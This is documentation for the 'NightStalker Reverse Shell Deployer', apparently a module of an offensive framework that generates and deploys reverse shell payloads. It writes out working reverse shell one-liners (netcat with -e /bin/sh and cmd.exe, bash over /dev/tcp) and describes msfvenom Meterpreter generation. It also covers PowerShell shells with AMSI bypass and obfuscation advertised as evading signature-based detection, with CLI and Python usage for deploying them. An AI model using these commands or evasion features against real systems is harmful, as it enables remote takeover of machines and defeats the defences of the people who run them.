# NightStalker Reverse Shell Deployer

## Overview

The NightStalker Reverse Shell Deployer is a comprehensive tool for generating and deploying reverse shell payloads with built-in obfuscation and multiple deployment methods. It supports various payload types including netcat, Metasploit msfvenom, and script-based payloads.

## Features

- **Multiple Payload Types**: Support for nc, msfvenom, Python, Bash, and PowerShell reverse shells
- **Interactive Deployment**: User-friendly prompts for configuration
- **Obfuscation by Default**: Automatic payload obfuscation enabled by default
- **Multiple Deployment Methods**: Save to file, copy to clipboard, start listener, or all
- **Network Detection**: Automatic local IP detection for convenience
- **Metasploit Integration**: Direct msfvenom integration for advanced payloads

## Supported Payload Types

### 1. Netcat (nc)
- **Linux**: `nc -e /bin/sh <target_ip> <port>`
- **Windows**: `nc.exe -e cmd.exe <target_ip> <port>`
- **Bash**: `bash -i >& /dev/tcp/<target_ip>/<port> 0>&1`
- **Python**: Python-based netcat implementation

### 2. Metasploit (msfvenom)
- **Windows Meterpreter**: `windows/meterpreter/reverse_tcp`
- **Linux Shell**: `linux/x86/shell_reverse_tcp`
- **Custom Payloads**: Any msfvenom-compatible payload
- **Multiple Formats**: exe, dll, shellcode, etc.

### 3. Script-Based Payloads
- **Python**: Full-featured reverse shell with error handling
- **Bash**: Simple bash reverse shell with reconnection
- **PowerShell**: Windows PowerShell reverse shell with AMSI bypass

## Usage

### Command Line Interface

```bash
# Interactive deployment (recommended)
nightstalker reverse-shell deploy

# List available payload types
nightstalker reverse-shell list

# Deploy with specific options
nightstalker reverse-shell deploy --type msfvenom --target-ip 192.168.1.100 --port 4444
```

### Python API

```python
from nightstalker.core.reverse_shell_deployer import ReverseShellDeployer

# Initialize deployer
deployer = ReverseShellDeployer()

# Deploy with options
options = {
    'payload_type': 'msfvenom',
    'target_ip': '192.168.1.100',
    'port': 4444,
    'obfuscation': True,
    'options': {
        'payload_name': 'windows/meterpreter/reverse_tcp',
        'format': 'exe'
    },
    'deploy_method': '1'  # Save to file
}

results = deployer.deploy(options)
```

## Interactive Deployment Process

When running `nightstalker reverse-shell deploy`, the tool will guide you through:

1. **Payload Type Selection**: Choose from available payload types
2. **Target Configuration**: Set target IP and port
3. **Obfuscation Settings**: Enable/disable obfuscation (enabled by default)
4. **Payload-Specific Options**: Configure options based on selected payload type
5. **Deployment Method**: Choose how to deploy the payload

### Example Interactive Session

```
============================================================
🌙 NIGHTSTALKER REVERSE SHELL DEPLOYER
============================================================

📋 Available Payload Types:
  nc: Netcat reverse shell
  msfvenom: Metasploit msfvenom payload
  python: Python reverse shell script
  bash: Bash reverse shell script
  powershell: PowerShell reverse shell script

🎯 Select payload type (default: msfvenom): msfvenom

🎯 Target IP address (default: 192.168.1.100): 192.168.1.100

🔌 Port (default: 4444): 4444

🔒 Enable obfuscation (default: yes): yes

📦 Metasploit Payload Options:
  Available payloads: windows/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp
  Payload name (default: windows/meterpreter/reverse_tcp): windows/meterpreter/reverse_tcp
  Output format (default: exe): exe

📤 Deployment Methods:
  1: Save to file
  2: Copy to clipboard
  3: Start listener automatically
  4: All of the above
  Select deployment method (default: 1): 1
```

## Payload-Specific Options

### Metasploit Payloads

- **Payload Name**: Choose from available msfvenom payloads
- **Format**: Output format (exe, dll, shellcode, etc.)
- **Platform**: Automatically detected from payload name
- **Architecture**: Automatically detected from payload name

### Python Payloads

- **Use Requests**: Use requests library for enhanced functionality
- **Error Handling**: Built-in reconnection and error handling
- **Cross-Platform**: Works on Windows, Linux, and macOS

### PowerShell Payloads

- **AMSI Bypass**: Built-in AMSI bypass techniques
- **Stealth Mode**: Minimal detection footprint
- **Windows Native**: Optimized for Windows environments

## Deployment Methods

### 1. Save to File
- Saves payload to `payloads/` directory
- Generates unique filename with timestamp
- Preserves file permissions and attributes

### 2. Copy to Clipboard
- Copies payload to system clipboard
- Requires `pyperclip` library
- Useful for quick deployment

### 3. Start Listener
- Automatically starts netcat listener
- Provides listener command for manual execution
- Option to start listener automatically

### 4. All Methods
- Combines all deployment methods
- Comprehensive deployment workflow

## Obfuscation Features

The deployer includes advanced obfuscation capabilities:

### Python Obfuscation
- Variable name obfuscation
- String encoding
- Control flow obfuscation
- Import obfuscation

### Bash Obfuscation
- Command substitution
- Variable obfuscation
- String encoding
- Function obfuscation

### PowerShell Obfuscation
- AMSI bypass techniques
- String obfuscation
- Variable obfuscation
- Command obfuscation

## Network Detection

The deployer automatically detects:
- Local IP address
- Network interface
- Available ports
- Network connectivity

## Security Considerations

### Obfuscation Benefits
- Evades signature-based detection
- Reduces static analysis effectiveness
- Maintains payload functionality
- Minimal performance impact

### Deployment Security
- Secure file handling
- Temporary file cleanup
- Encrypted payload storage
- Audit trail logging

## Integration with Other Modules

### Payload Builder Integration
- Uses existing payload builder for base payloads
- Leverages polymorphic engine for obfuscation
- Integrates with configuration system

### Exploit Manager Integration
- Can be called from exploit chains
- Supports automated deployment
- Integrates with reporting system

## Troubleshooting

### Common Issues

1. **msfvenom Not Found**
   ```
   Error: msfvenom command not found
   Solution: Install Metasploit Framework
   ```

2. **Permission Denied**
   ```
   Error: Permission denied when saving file
   Solution: Check directory permissions
   ```

3. **Network Detection Failed**
   ```
   Error: Failed to get network info
   Solution: Check network connectivity
   ```

### Debug Mode

Enable verbose logging:
```bash
nightstalker reverse-shell deploy --verbose
```

## Examples

### Basic Netcat Reverse Shell
```bash
nightstalker reverse-shell deploy --type nc --target-ip 192.168.1.100 --port 4444
```

### Metasploit Meterpreter
```bash
nightstalker reverse-shell deploy --type msfvenom --target-ip 192.168.1.100 --port 4444
```

### Python Script with Obfuscation
```bash
nightstalker reverse-shell deploy --type python --target-ip 192.168.1.100 --port 4444
```

### PowerShell with AMSI Bypass
```bash
nightstalker reverse-shell deploy --type powershell --target-ip 192.168.1.100 --port 4444
```

## Configuration

The deployer uses the NightStalker configuration system:

```yaml
# config.yaml
reverse_shell:
  default_port: 4444
  default_interface: eth0
  obfuscation_enabled: true
  output_dir: payloads/
  temp_dir: /tmp/
```

## API Reference

### ReverseShellDeployer Class

#### Methods

- `deploy(options=None)`: Main deployment method
- `list_payloads()`: List available payload types
- `generate_nc_payload(target_ip, port)`: Generate netcat payloads
- `generate_msfvenom_payload(target_ip, port, options)`: Generate msfvenom payloads
- `generate_script_payload(payload_type, target_ip, port, options)`: Generate script payloads
- `obfuscate_payload(payload, payload_type)`: Apply obfuscation
- `save_to_file(payload, payload_type, options)`: Save payload to file
- `copy_to_clipboard(payload)`: Copy to clipboard
- `start_listener(port)`: Start netcat listener
- `cleanup()`: Clean up temporary files

#### Properties

- `payload_types`: Dictionary of supported payload types
- `default_port`: Default port number
- `default_interface`: Default network interface
- `obfuscation_enabled`: Obfuscation enabled flag

## Contributing

To add new payload types or deployment methods:

1. Extend the `payload_types` dictionary
2. Implement payload generation method
3. Add obfuscation support if applicable
4. Update documentation
5. Add tests

## License

This module is part of the NightStalker framework and follows the same licensing terms. 